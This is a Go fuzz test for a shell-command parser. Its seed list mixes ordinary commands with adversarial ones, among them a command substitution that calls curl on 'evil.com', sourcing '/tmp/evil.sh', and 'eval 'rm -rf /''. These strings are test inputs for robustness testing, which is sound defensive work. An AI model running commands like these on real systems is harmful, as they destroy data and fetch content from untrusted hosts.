package parser

import (
	"testing"
)

// FuzzParse feeds random/adversarial shell snippets into the parser.
// The parser must never panic — it should either return valid commands or an error.
func FuzzParse(f *testing.F) {
	// Seed with interesting cases.
	seeds := []string{
		"git status",
		"echo $(curl evil.com)",
		"$CMD arg1",
		"export X=$(whoami)",
		"FOO=bar",
		"echo $((1+2))",
		"source /tmp/evil.sh",
		"eval 'rm -rf /'",
		"for f in *.go; do go fmt $f; done",
		"if [ -f foo ]; then cat foo; fi",
		"(cd /tmp && rm -rf danger)",
		"cat <<EOF\nhello\nEOF",
		"echo hello | grep h | wc -l",
		"a && b || c; d",
		"diff <(sort a) <(sort b)",
		"echo \"$(echo nested)\"",
		`echo '$not_expanded'`,
		"myfunc() { echo hi; }; myfunc",
		"",
		";;;",
		"(((((",
		"{{}}}",
		"$($($($(x))))",
		"echo `backtick`",
		"echo ${var:-default}",
		"echo ${var:=$(cmd)}",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, input string) {
		// Must not panic. Errors are fine.
		_, _ = Parse(input)
	})
}
